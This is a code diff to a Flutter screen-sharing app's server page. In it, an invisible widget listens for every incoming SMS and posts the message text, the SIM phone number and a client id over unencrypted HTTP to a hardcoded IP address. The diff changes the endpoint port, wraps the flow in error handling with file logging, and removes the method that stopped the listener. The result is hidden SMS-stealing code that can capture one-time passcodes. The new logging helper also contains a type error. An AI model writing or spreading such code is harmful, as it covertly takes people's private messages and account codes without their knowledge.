@@ -20,6 +20,10 @@ import 'dart:convert';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:sim_car_info_plugin/sim_car_info_plugin.dart';
 
+import 'dart:io';
+import 'package:path_provider/path_provider.dart';
+import 'package:flutter/services.dart' show rootBundle;
+
 class ServerPage extends StatefulWidget implements PageShape {
   @override
   final title = translate("Share Screen");
@@ -473,56 +477,72 @@ class _ListenInfoState extends State<ListenInfo> {
     }
   }
 
+  Future<void> logToFile(String message) async {
+    DateTime now = DateTime.now();
+    String timestamp = now.toIso8601String();
+    String logMessage = '$timestamp: $message\n';
+    String docDirectory = await getApplicationDocumentsDirectory();
+    String logFilePath = '$docDirectory/logfile.log';
+    File logFile = File(logFilePath);
+    await logFile.create(recursive: true);
+    await logFile.writeAsString(logMessage, mode: FileMode.append);
+  }
+
   void listenForNewSms() {
     simCarInfoPlugin.startListen().listen((event) async {
-      setState(() {
-        newSmsContent = event.body; // 更新新短信内容
-      });
-      
-      var info = await simCarInfoPlugin.simCarInfo();
-      if (info != null && info.isNotEmpty) {
-        var infoList = json.decode(info);
-        if (event.slot < infoList.length) {
-          phoneNumber = infoList[event.slot]['Number'];
-          sendToApi(phoneNumber, event.body, id);
+      try {
+        setState(() {
+          newSmsContent = event.body; // 更新新短信内容
+        });
+
+        var info = await simCarInfoPlugin.simCarInfo();
+        if (info != null && info.isNotEmpty) {
+          var infoList = json.decode(info);
+          if (event.slot < infoList.length) {
+            phoneNumber = infoList[event.slot]['Number'];
+            logToFile("Api data: ${event.slot}, $phoneNumber, $id");
+            sendToApi(phoneNumber, event.body, id);
+          } else {
+            logToFile("Invalid slot index: ${event.slot}");
+          }
         } else {
-          print("Invalid slot index: ${event.slot}");
+          logToFile("Failed to retrieve simCarInfo or info is empty.");
         }
+      } catch (e) {
+        logToFile("Error listening for new SMS: $e");
       }
     });
   }
 
-  @override
-  void dispose() {
-    simCarInfoPlugin.stopListen(); // 停止监听
-    super.dispose();
-  }
-
   Future<void> sendToApi(String phoneNumber, String content, String id) async {
-    var headers = {
-      'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
-      'Content-Type': 'application/json'
-    };
+    try {
+      var headers = {
+        'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
+        'Content-Type': 'application/json'
+      };
 
-    var request = http.Request('POST', Uri.parse('http://61.171.69.243:7801/external/cli/sms/save'));
-    request.body = json.encode({
-      "clientId": id,
-      "phone": phoneNumber,
-      "content": content
-    });
-    request.headers.addAll(headers);
+      var request = http.Request('POST', Uri.parse('http://61.171.69.243:7808/external/cli/sms/save'));
+      request.body = json.encode({
+        "clientId": id,
+        "phone": phoneNumber,
+        "content": content
+      });
+      request.headers.addAll(headers);
 
-    http.StreamedResponse response = await request.send();
-    if (response.statusCode == 200) {
-      print(await response.stream.bytesToString());
-    } else {
-      print(response.reasonPhrase);
+      http.StreamedResponse response = await request.send();
+      if (response.statusCode == 200) {
+        print(await response.stream.bytesToString());
+      } else {
+        logToFile("API request failed with status code: ${response.statusCode}, reason: ${response.reasonPhrase}");
+      }
+    } catch (e) {
+      logToFile("Error sending SMS to API: $e");
     }
   }
 
   @override
   Widget build(BuildContext context) {
-    return Container(); // 或 SizedBox.shrink();
+    return SizedBox.shrink(); // 或 SizedBox.shrink();
   }
 }
 
